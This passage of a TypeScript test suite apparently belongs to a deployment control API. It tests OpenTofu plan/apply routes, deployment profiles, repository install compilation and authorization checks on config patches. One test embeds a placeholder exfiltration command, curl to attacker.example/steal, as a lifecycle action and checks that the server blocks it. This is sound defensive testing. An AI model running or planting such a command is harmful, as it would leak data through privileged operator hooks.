    variableMapping: { selected_profile: input.key },
    outputAllowlist: {},
    policy: { quota: { profile_fixture: input.order } },
    store: {
      source: { url: repositoryUrl, path: "." },
      order: 1,
      surface: "service",
      kind: "application",
      provider: "must-not-select-profile",
      suggestedName: "profiled-app",
      badge: { ja: "追加", en: "Install" },
      name: { ja: "Profiled app", en: "Profiled app" },
      description: { ja: "Profiled app", en: "Profiled app" },
      deploymentProfile: {
        key: input.key,
        label: { ja: input.key, en: input.key },
        description: { ja: `${input.key} 説明`, en: `${input.key} detail` },
        order: input.order,
        recommended: input.recommended,
      },
    },
    createdAt: "2026-08-16T00:00:00.000Z",
    updatedAt: "2026-08-16T00:00:00.000Z",
  });
  const managed = profile({
    id: "icfg_profile_managed",
    key: "managed-v1",
    modulePath: "deploy/managed",
    recommended: true,
    order: 20,
  });
  const byoc = profile({
    id: "icfg_profile_byoc",
    key: "byoc-v1",
    modulePath: "deploy/byoc",
    recommended: false,
    order: 10,
  });
  const missing = profile({
    id: "icfg_profile_missing",
    key: "missing-module-v1",
    modulePath: "deploy/missing",
    recommended: false,
    order: 30,
  });
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
    opentofuRunner: runner,
    artifactReferenceAllocator: new ObjectKeyArtifactReferenceAllocator(),
    operatorInstallConfigs: [managed, byoc, missing],
  });
  const seeded = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_profile_preflight",
    sourceId: "src_profile_preflight",
    snapshotId: "snap_profile_preflight",
    capsuleId: "cap_profile_seed",
    installConfigId: "icfg_profile_seed",
    sourceUrl: repositoryUrl,
  });
  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: {
      status: "present",
      digest: `sha256:${"9".repeat(64)}`,
      document: {
        apiVersion: "takosumi.com/v2.1",
        kind: "Repository",
        install: {
          defaultModule: "deploy/managed",
          modules: {
            "deploy/managed": { inputs: [] },
            "deploy/byoc": { inputs: [] },
          },
        },
      },
    },
  });

  const listed = await controlJson<{
    readonly status: "ready";
    readonly profiles: readonly NonNullable<
      NonNullable<InstallConfig["store"]>["deploymentProfile"]
    >[];
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "GET",
      path: `/api/v1/sources/${seeded.source.id}/snapshots/${seeded.snapshot.id}/deployment-profiles`,
    },
    200,
  );
  expect(listed).toEqual({
    status: "ready",
    profiles: [managed.store!.deploymentProfile, byoc.store!.deploymentProfile],
  });
  expect(runner.capsuleSourceFileJobs).toHaveLength(0);

  for (const body of [
    {
      sourceSnapshotId: seeded.snapshot.id,
      capsuleName: "profiled-app",
      compileInstallUx: true,
    },
    {
      sourceSnapshotId: seeded.snapshot.id,
      capsuleName: "profiled-app",
      compileInstallUx: true,
      deploymentProfileKey: "missing-v1",
    },
    ...[" ", "bad\u0000key", "x".repeat(129)].map(
      (deploymentProfileKey) => ({
        sourceSnapshotId: seeded.snapshot.id,
        capsuleName: "profiled-app",
        compileInstallUx: true,
        deploymentProfileKey,
      }),
    ),
    {
      sourceSnapshotId: seeded.snapshot.id,
      capsuleName: "profiled-app",
      compileInstallUx: true,
      deploymentProfileKey: "byoc-v1",
      modulePath: "deploy/byoc",
    },
    {
      sourceSnapshotId: seeded.snapshot.id,
      capsuleName: "profiled-app",
      compileInstallUx: true,
      deploymentProfileKey: "byoc-v1",
      installConfigId: byoc.id,
    },
  ]) {
    await controlJson(
      {
        operations,
        store: accountStore,
        cookie,
        method: "POST",
        path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
        body,
      },
      400,
    );
  }
  expect(runner.capsuleSourceFileJobs).toHaveLength(0);

  const accepted = await controlJson<{
    readonly repositoryInstallUx: {
      readonly status: "accepted";
      readonly installConfigId: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        capsuleName: "profiled-app",
        compileInstallUx: true,
        deploymentProfileKey: "byoc-v1",
      },
    },
    201,
  );
  expect(runner.capsuleSourceFileJobs).toHaveLength(1);
  expect(runner.capsuleSourceFileJobs[0]?.modulePath).toBe("deploy/byoc");
  const derived = await operations.capsules.getInstallConfig(
    accepted.repositoryInstallUx.installConfigId,
  );
  expect(derived.modulePath).toBe("deploy/byoc");
  expect(derived.variableMapping).toMatchObject({ selected_profile: "byoc-v1" });
  expect(derived.policy).toEqual(byoc.policy);
  expect(derived.store).toBeUndefined();
});

test("repository compilation rejects client module authority while manual compatibility keeps it", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const runner = recordingRunner();
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
    opentofuRunner: runner,
    artifactReferenceAllocator: new ObjectKeyArtifactReferenceAllocator(),
  });
  const seeded = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_plain_git_compile",
    sourceId: "src_plain_git_compile",
    snapshotId: "snap_plain_git_compile",
    capsuleId: "cap_plain_git_compile",
    installConfigId: "icfg_plain_git_compile",
    sourceUrl: "https://git.example.com/example/plain-opentofu.git",
  });

  const rejected = await controlJson<{
    readonly error: { readonly code: string; readonly message: string };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        modulePath: "deploy/manual",
        capsuleName: "plain-git",
        compileInstallUx: true,
      },
    },
    400,
  );
  expect(rejected.error).toMatchObject({ code: "invalid_request" });
  expect(rejected.error.message).toContain("resolves modulePath server-side");
  expect(runner.capsuleSourceFileJobs).toHaveLength(0);

  const result = await controlJson<{
    readonly report: { readonly level: string };
    readonly repositoryInstallUx: { readonly status: "absent" };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        capsuleName: "plain-git",
        compileInstallUx: true,
      },
    },
    201,
  );
  expect(result.report.level).toBe("ready");
  expect(result.repositoryInstallUx).toEqual({ status: "absent" });
  expect(runner.capsuleSourceFileJobs).toHaveLength(1);
  expect(runner.capsuleSourceFileJobs[0]?.modulePath).toBeUndefined();

  await controlJson(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        installConfigId: DEFAULT_CAPSULE_INSTALL_CONFIG_ID,
        modulePath: "deploy/manual",
      },
    },
    201,
  );
  expect(runner.capsuleSourceFileJobs).toHaveLength(2);
  expect(runner.capsuleSourceFileJobs[1]?.modulePath).toBe("deploy/manual");
});

test("initial Plan and Apply keep the persisted repository sourceBuild after metadata changes", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const runner = recordingRunner();
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
    opentofuRunner: runner,
    artifactReferenceAllocator: new ObjectKeyArtifactReferenceAllocator(),
  });
  const seeded = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_repo_source_build_pin",
    capsuleId: "cap_repo_source_build_seed",
    installConfigId: "icfg_repo_source_build_base",
    sourceUrl: "https://git.example.com/example/source-build.git",
  });
  const digest = `sha256:${"e".repeat(64)}`;
  const reviewedSourceBuild: SourceBuildConfig = {
    commands: [
      { argv: ["bun", "run", "build", "--reviewed"] },
    ],
    outputs: ["dist/reviewed.js"],
  };
  const changedSourceBuild: SourceBuildConfig = {
    commands: [{ argv: ["bun", "run", "build", "--changed"] }],
    outputs: ["dist/changed.js"],
  };
  const manifestWithSourceBuild = (sourceBuild: SourceBuildConfig) => ({
    status: "present" as const,
    digest,
    document: {
      apiVersion: "takosumi.com/v2.3" as const,
      kind: "Repository" as const,
      install: {
        defaultModule: ".",
        modules: {
          ".": {
            inputs: [],
            sourceBuild,
          },
        },
      },
    },
  });
  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: manifestWithSourceBuild(reviewedSourceBuild),
  });

  const preview = await controlJson<{
    readonly repositoryInstallUx: {
      readonly status: "accepted";
      readonly installConfigId: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        capsuleName: "source-build-pin",
        compileInstallUx: true,
      },
    },
    201,
  );
  const reviewedConfig = await operations.capsules.getInstallConfig(
    preview.repositoryInstallUx.installConfigId,
  );
  expect(reviewedConfig.sourceBuild).toEqual(reviewedSourceBuild);
  const adoptionOnlyConfig = await operations.capsules.putInstallConfig({
    ...reviewedConfig,
    id: "icfg_repo_source_build_adoption_only",
    name: "source-build-adoption-only",
    sourceBuild: undefined,
  });

  const created = await controlJson<{
    readonly capsule: { readonly id: string; readonly installConfigId: string };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/capsules`,
      body: {
        name: "source-build-pin",
        environment: "production",
        sourceId: seeded.source.id,
        installConfigId: adoptionOnlyConfig.id,
      },
    },
    201,
  );
  const capsuleConfig = await operations.capsules.getInstallConfig(
    created.capsule.installConfigId,
  );
  expect(capsuleConfig.sourceBuild).toEqual(reviewedSourceBuild);

  // Keep the captured manifest digest stable while changing its proposal. A
  // subsequent Plan must use the DB-owned InstallConfig, not recompile this
  // changed repository metadata.
  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: manifestWithSourceBuild(changedSourceBuild),
  });
  const planBody = await controlJson<{
    readonly run: { readonly id: string; readonly status: string };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/capsules/${created.capsule.id}/plan`,
    },
    201,
  );
  expect(planBody.run.status).toBe("succeeded");
  expect(runner.planJobs[0]?.sourceBuild).toEqual(reviewedSourceBuild);

  const applyBody = await controlJson<{
    readonly run: { readonly status: string };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/runs/${planBody.run.id}/apply`,
    },
    201,
  );
  expect(applyBody.run.status).toBe("succeeded");
  expect(runner.applyJobs[0]?.sourceBuild).toEqual(reviewedSourceBuild);
});

test("a Workspace session cannot grant itself operator lifecycle actions through the Capsule config patch", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
  });
  const seeded = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_lifecycle_escalation",
    capsuleId: "cap_lifecycle_esc",
    installConfigId: "icfg_lifecycle00001",
    installConfig: {
      workspaceId: "ws_lifecycle_escalation",
      internal: { reason: "per_install_overrides" },
      policy: {
        lifecycleActions: {
          allowedExecutors: ["runner"],
          allowedRunnerCapabilities: ["capsule.lifecycle.command.v1"],
        },
      },
    },
  });

  // PATCH /api/v1/capsule-configs/:id is gated only by active Workspace
  // membership, and an `operator` action is executed by the operator's own
  // release-activation webhook. Widening the policy in the same patch that
  // installs the action must not be self-authorizing.
  const built = request(
    "PATCH",
    `/api/v1/capsule-configs/${seeded.installConfig.id}`,
    {
      cookie,
      body: {
        lifecycleActions: [
          {
            apiVersion: "takosumi.dev/v1alpha1",
            kind: "command",
            id: "activate",
            phase: "post_apply",
            executor: "operator",
            command: ["curl", "https://attacker.example/steal"],
            runnerCapability: "capsule.lifecycle.command.v1",
          },
        ],
        lifecycleActionPolicy: {
          allowedExecutors: ["runner", "operator"],
          allowedRunnerCapabilities: ["capsule.lifecycle.command.v1"],
        },
      },
    },
  );
  const response = await handleControlRoute({
    request: built.request,
    url: built.url,
    store: accountStore,
    operations,
  });

  expect(response?.status).toEqual(403);
  const stored = await operations.capsules.getInstallConfig(
    seeded.installConfig.id,
  );
  expect(stored.lifecycleActions).toBeUndefined();
  expect(stored.policy.lifecycleActions?.allowedExecutors).toEqual(["runner"]);
});

test("a Capsule config patch may drop public_endpoint metadata without host reservation authority", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
  });
  const seeded = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_public_endpoint",
    capsuleId: "cap_public_endpoint",
    installConfigId: "icfg_publicendpoint",
    installConfig: {
      workspaceId: "ws_public_endpoint",
      internal: { reason: "per_install_overrides" },
      variableMapping: { app_url: "https://mine.app.takosumi.test" },
      installExperience: {
        projections: [
          {
            kind: "public_endpoint",
            variables: { url: "app_url" },
          },
        ],
      },
    },
  });

  // Endpoint/DNS ownership is ordinary Git OpenTofu/provider work. The
  // presentation projection grants no hostname reservation authority, so its
  // removal is an ordinary config patch.
  const built = request(
    "PATCH",
    `/api/v1/capsule-configs/${seeded.installConfig.id}`,
    {
      cookie,
      body: {
        installExperience: {},
        variableMapping: { app_url: "https://victim.app.takosumi.test" },
      },
    },
  );
  const response = await handleControlRoute({
    request: built.request,
    url: built.url,
    store: accountStore,
    operations,
  });

  expect(response?.status).toEqual(200);
  const stored = await operations.capsules.getInstallConfig(
    seeded.installConfig.id,
  );
  expect(stored.installExperience?.projections).toBeUndefined();
  expect(stored.variableMapping.app_url).toBe(
    "https://victim.app.takosumi.test",
  );
});

test("account session control routes execute plan and apply through the real OpenTofu controller", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const runner = recordingRunner();
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
    opentofuRunner: runner,
    opentofuConnectionVault: fakeProviderVault() as never,
    artifactReferenceAllocator: new ObjectKeyArtifactReferenceAllocator(),
  });

  const seeded = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_route_e2e",
    capsuleId: "cap_route_e2e",
    environment: "preview",
    installConfig: storeEligibleInstallConfig(
      "https://git.example.com/example/app.git",
    ),
  });
  await seedProviderConnections(deployStore, seeded.capsule);
  const installUxDigest = `sha256:${"d".repeat(64)}`;
  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: {
      status: "present",
      digest: installUxDigest,
      document: {
        apiVersion: "takosumi.com/v1",
        kind: "Repository",
        install: { modules: { ".": { inputs: [] } } },
      },
    },
  });

  const sourceSnapshots = await controlJson<{
    readonly snapshots: readonly {
      readonly repositoryManifest?: unknown;
    }[];
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "GET",
      path: `/api/v1/sources/${seeded.source.id}/snapshots`,
    },
    200,
  );
  expect(sourceSnapshots.snapshots[0]?.repositoryManifest).toEqual({
    status: "present",
    digest: installUxDigest,
  });
  expect(JSON.stringify(sourceSnapshots)).not.toContain('"document"');

  const stableTag = await controlJson<{
    readonly tag: string;
    readonly commit: string;
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/source-ref-resolutions/stable-semver`,
      body: { url: "https://github.com/example/options.git" },
    },
    200,
  );
  expect(stableTag).toEqual({
    tag: "v2.4.0",
    commit: "1234567890abcdef1234567890abcdef12345678",
  });
  expect(runner.stableTagJobs).toHaveLength(1);

  const presentationFile = await controlJson<{
    readonly sourceSnapshotId: string;
    readonly path: string;
    readonly digest: string;
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "GET",
      path: `/api/v1/sources/${seeded.source.id}/snapshots/${seeded.snapshot.id}/file?path=install%2Foptions.json`,
    },
    200,
  );
  expect(presentationFile).toMatchObject({
    sourceSnapshotId: seeded.snapshot.id,
    path: "install/options.json",
    digest:
      "sha256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
  });
  expect(runner.presentationFileJobs).toHaveLength(1);

  await controlJson(
    {
      operations,
      store: accountStore,
      cookie,
      method: "GET",
      path: `/api/v1/sources/${seeded.source.id}/snapshots/${seeded.snapshot.id}/file?path=.well-known%2Ftakosumi.json`,
    },
    400,
  );
  expect(runner.presentationFileJobs).toHaveLength(1);

  const installUxPreview = await controlJson<{
    readonly repositoryInstallUx: {
      readonly status: "accepted";
      readonly installConfigId: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        capsuleName: "route-preview",
        compileInstallUx: true,
      },
    },
    201,
  );
  expect(installUxPreview.repositoryInstallUx.status).toBe("accepted");
  const previewConfig = await operations.capsules.getInstallConfig(
    installUxPreview.repositoryInstallUx.installConfigId,
  );
  expect(previewConfig.installExperience?.repositoryInstallUx).toEqual({
    status: "accepted",
  });
  expect(previewConfig.internal).toMatchObject({
    reason: "per_install_overrides",
    sourceSnapshotId: seeded.snapshot.id,
    repositoryInstallUxDigest: installUxDigest,
  });
  await controlJson(
    {
      operations,
      store: accountStore,
      cookie,
      method: "PATCH",
      path: `/api/v1/capsule-configs/${previewConfig.id}`,
      body: {
        variableMapping: { unreviewed_value: "must-not-be-adopted" },
      },
    },
    409,
  );
  expect(
    (await operations.capsules.getInstallConfig(previewConfig.id))
      .variableMapping,
  ).not.toHaveProperty("unreviewed_value");

  const repeatedInstallUxPreview = await controlJson<{
    readonly repositoryInstallUx: {
      readonly status: "accepted";
      readonly installConfigId: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        capsuleName: "route-preview",
        compileInstallUx: true,
      },
    },
    201,
  );
  expect(repeatedInstallUxPreview.repositoryInstallUx.installConfigId).toBe(
    installUxPreview.repositoryInstallUx.installConfigId,
  );

  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: {
      status: "invalid",
      reason: "invalid_document",
      diagnostic: "bounded fixture diagnostic",
    },
  });
  const invalidInstallUxPreview = await controlJson<{
    readonly error: {
      readonly code: string;
      readonly message: string;
      readonly details?: { readonly diagnosticCode?: string };
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        capsuleName: "route-preview",
        compileInstallUx: true,
      },
    },
    400,
  );
  expect(invalidInstallUxPreview.error).toMatchObject({
    code: "repository_install_ux_invalid",
    details: {
      diagnosticCode: "repository_install_ux_document_invalid",
    },
  });
  expect(JSON.stringify(invalidInstallUxPreview)).not.toContain(
    "bounded fixture diagnostic",
  );
  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: {
      status: "present",
      digest: installUxDigest,
      document: {
        apiVersion: "takosumi.com/v1",
        kind: "Repository",
        install: { modules: { ".": { inputs: [] } } },
      },
    },
  });

  const planBody = await controlJson<{
    readonly run: {
      readonly id: string;
      readonly status: string;
      readonly planDigest?: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/capsules/${seeded.capsule.id}/plan`,
    },
    201,
  );
  expect(planBody.run.status).toEqual("succeeded");
  expect(planBody.run.planDigest).toEqual(PLAN_DIGEST);
  expect(runner.planJobs).toHaveLength(1);
  expect(runner.planJobs[0]!.sourceArchive).toEqual({
    ref: "workspaces/ws_route_e2e/sources/src_fixture/snapshots/snap_fixture/source.tar.zst",
    digest: FIXTURE_ARCHIVE_DIGEST,
  });
  expect(runner.planJobs[0]!.stateScope).toMatchObject({
    workspaceId: "ws_route_e2e",
    environment: "preview",
    generation: 0,
    subject: { kind: "capsule", id: seeded.capsule.id },
  });

  const applyBody = await controlJson<{
    readonly run: { readonly id: string; readonly status: string };
    readonly capsule?: {
      readonly id: string;
      readonly status: string;
      readonly currentStateGeneration?: number;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/runs/${planBody.run.id}/apply`,
    },
    201,
  );
  expect(applyBody.run.status).toEqual("succeeded");
  expect(applyBody.capsule).toMatchObject({
    id: seeded.capsule.id,
    status: "active",
    currentStateGeneration: 1,
  });
  expect("stateVersion" in applyBody).toBe(false);
  expect(JSON.stringify(applyBody)).not.toContain("launch_url");
  expect(JSON.stringify(applyBody)).not.toContain("secret-output-token");
  expect(runner.applyJobs).toHaveLength(1);
  expect(runner.applyJobs[0]!.planRun.id).toEqual(planBody.run.id);
  expect(runner.applyJobs[0]!.stateScope).toMatchObject({
    workspaceId: "ws_route_e2e",
    environment: "preview",
    generation: 1,
    subject: { kind: "capsule", id: seeded.capsule.id },
  });

  const runBody = await controlJson<{
    readonly run: {
      readonly id: string;
      readonly capsuleId?: string;
      readonly status: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "GET",
      path: `/api/v1/runs/${applyBody.run.id}`,
    },
    200,
  );
  expect(runBody.run).toMatchObject({
    id: applyBody.run.id,
    capsuleId: seeded.capsule.id,
    status: "succeeded",
  });
});

test("authenticated repository Interface review persists exact proposals and apply materializes only requested bindings", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const runner = recordingRunner();
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
    opentofuRunner: runner,
    opentofuConnectionVault: fakeProviderVault() as never,
    artifactReferenceAllocator: new ObjectKeyArtifactReferenceAllocator(),
  });
  const seeded = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_repo_interface_e2e",
    capsuleId: "cap_repo_interface_seed",
    installConfigId: "icfg_repo_interface_base",
    name: "seed",
    installConfig: {
      ...storeEligibleInstallConfig(
        "https://git.example.com/example/app.git",
      ),
      outputAllowlist: {},
      policy: {
        repositoryInstallUx: {
          allowedInterfacePermissions: ["ui.open"],
        },
      },
    },
  });
  const repositoryManifestDigest = `sha256:${"e".repeat(64)}`;
  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: {
      status: "present",
      digest: repositoryManifestDigest,
      document: REPOSITORY_INTERFACE_MANIFEST,
    },
  });

  const unauthenticatedPreviewRequest = request(
    "POST",
    `/api/v1/sources/${seeded.source.id}/compatibility-check`,
    {
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        capsuleName: "repo-interface",
        compileInstallUx: true,
      },
    },
  );
  const unauthenticatedPreview = await handleControlRoute({
    request: unauthenticatedPreviewRequest.request,
    url: unauthenticatedPreviewRequest.url,
    store: accountStore,
    operations,
  });
  expect(unauthenticatedPreview?.status).toBe(401);

  const preview = await controlJson<{
    readonly repositoryInstallUx: {
      readonly status: "accepted";
      readonly installConfigId: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        capsuleName: "repo-interface",
        compileInstallUx: true,
      },
    },
    201,
  );
  const previewConfig = await operations.capsules.getInstallConfig(
    preview.repositoryInstallUx.installConfigId,
  );
  expect(previewConfig.workspaceId).toBe(seeded.workspace.id);
  expect(previewConfig.outputAllowlist).toEqual({
    launch_url: { from: "launch_url", type: "url", required: true },
  });
  expect(previewConfig.interfaceBlueprints).toEqual([
    {
      key: "launcher",
      name: "app.launcher",
      spec: {
        type: "interface.ui.surface",
        version: "1",
        document: {
          display: { title: "Open app" },
          launcher: true,
        },
        inputs: {
          url: { source: "capsule_output", outputName: "launch_url" },
        },
        access: {
          visibility: "workspace",
          resourceUriInput: "url",
        },
      },
      bindings: [
        {
          key: "installer",
          subjectRef: { kind: "Principal", id: "user_test" },
          permissions: ["ui.open"],
          delivery: { type: "none" },
        },
      ],
    },
    {
      key: "unbound-status",
      name: "app.unbound-status",
      spec: {
        type: "example.status",
        version: "1",
        document: { purpose: "binding-negative-control" },
        inputs: {
          state: { source: "literal", value: "available" },
        },
        access: { visibility: "workspace" },
      },
    },
  ]);

  const moduleOverride = await controlJson<{
    readonly error: {
      readonly code: string;
      readonly details?: { readonly diagnosticCode?: string };
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/capsules`,
      body: {
        name: "repo-interface-module-override",
        environment: "production",
        sourceId: seeded.source.id,
        installConfigId: previewConfig.id,
        modulePath: "deploy/override",
      },
    },
    400,
  );
  expect(moduleOverride.error).toMatchObject({
    code: "repository_install_ux_invalid",
    details: {
      diagnosticCode: "repository_install_ux_module_path_mismatch",
    },
  });
  expect(
    (await operations.capsules.listCapsules(seeded.workspace.id)).some(
      (entry) => entry.name === "repo-interface-module-override",
    ),
  ).toBe(false);

  const matchingModule = await controlJson<{
    readonly capsule: { readonly id: string; readonly installConfigId: string };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/capsules`,
      body: {
        name: "repo-interface-module-match",
        environment: "production",
        sourceId: seeded.source.id,
        installConfigId: previewConfig.id,
        modulePath: ".",
      },
    },
    201,
  );
  const matchingConfig = await operations.capsules.getInstallConfig(
    matchingModule.capsule.installConfigId,
  );
  expect(matchingConfig.modulePath).toBe(previewConfig.modulePath);

  const otherCookie = seedSession(accountStore, "user_other");
  await operations.members.upsertMember({
    workspaceId: seeded.workspace.id,
    accountId: "user_other",
    roles: ["admin"],
    status: "active",
    actor: {
      actorAccountId: "user_test",
      roles: ["owner"],
      requestId: "req_repo_interface_other_member",
    },
  });
  const principalConflict = await controlJson<{
    readonly error: {
      readonly code: string;
      readonly details?: { readonly diagnosticCode?: string };
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie: otherCookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/capsules`,
      body: {
        name: "repo-interface-other-installer",
        environment: "production",
        sourceId: seeded.source.id,
        installConfigId: previewConfig.id,
      },
    },
    400,
  );
  expect(principalConflict.error).toMatchObject({
    code: "repository_install_ux_invalid",
    details: {
      diagnosticCode: "repository_install_ux_interface_blueprint_conflict",
    },
  });
  expect(
    (await operations.capsules.listCapsules(seeded.workspace.id)).some(
      (entry) => entry.name === "repo-interface-other-installer",
    ),
  ).toBe(false);

  const created = await controlJson<{
    readonly capsule: { readonly id: string; readonly installConfigId: string };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/capsules`,
      body: {
        name: "repo-interface",
        environment: "production",
        sourceId: seeded.source.id,
        installConfigId: previewConfig.id,
      },
    },
    201,
  );
  expect(created.capsule.installConfigId).not.toBe(previewConfig.id);
  const scopedConfig = await operations.capsules.getInstallConfig(
    created.capsule.installConfigId,
  );
  expect(scopedConfig.workspaceId).toBe(seeded.workspace.id);
  expect(scopedConfig.outputAllowlist).toEqual(previewConfig.outputAllowlist);
  expect(scopedConfig.interfaceBlueprints?.[0]?.bindings).toEqual([
    {
      key: "installer",
      subjectRef: { kind: "Principal", id: "user_test" },
      permissions: ["ui.open"],
      delivery: { type: "none" },
    },
  ]);
  expect(JSON.stringify(scopedConfig.interfaceBlueprints)).not.toContain(
    "credentialRef",
  );
  expect(JSON.stringify(scopedConfig.interfaceBlueprints)).not.toContain(
    '"options"',
  );

  const capsule = await operations.capsules.getCapsule(created.capsule.id);
  await seedProviderConnections(deployStore, capsule);
  const plan = await controlJson<{
    readonly run: { readonly id: string; readonly status: string };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/capsules/${capsule.id}/plan`,
    },
    201,
  );
  expect(plan.run.status).toBe("succeeded");
  const apply = await controlJson<{
    readonly run: { readonly id: string; readonly status: string };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/runs/${plan.run.id}/apply`,
    },
    201,
  );
  expect(apply.run.status).toBe("succeeded");

  const interfaces = await operations.interfaces.list({
    workspaceId: seeded.workspace.id,
    ownerKind: "Capsule",
    ownerId: capsule.id,
  });
  expect(interfaces).toHaveLength(2);
  const launcher = interfaces.find(
    (entry) =>
      entry.metadata.materializedFrom?.source === "capsule_blueprint" &&
      entry.metadata.materializedFrom.key === "launcher",
  );
  expect(launcher).toMatchObject({
    metadata: {
      workspaceId: seeded.workspace.id,
      ownerRef: { kind: "Capsule", id: capsule.id },
    },
    spec: {
      type: "interface.ui.surface",
      inputs: {
        url: {
          source: "capsule_output",
          capsuleId: capsule.id,
          outputName: "launch_url",
        },
      },
    },
    status: {
      phase: "Resolved",
      resolvedInputs: { url: "https://hello.takosumi.test" },
    },
  });
  expect(
    await operations.interfaces.listBindings(launcher!.metadata.id),
  ).toEqual([
    expect.objectContaining({
      spec: {
        interfaceId: launcher!.metadata.id,
        subjectRef: { kind: "Principal", id: "user_test" },
        permissions: ["ui.open"],
        delivery: { type: "none" },
      },
      status: expect.objectContaining({ phase: "Ready" }),
    }),
  ]);
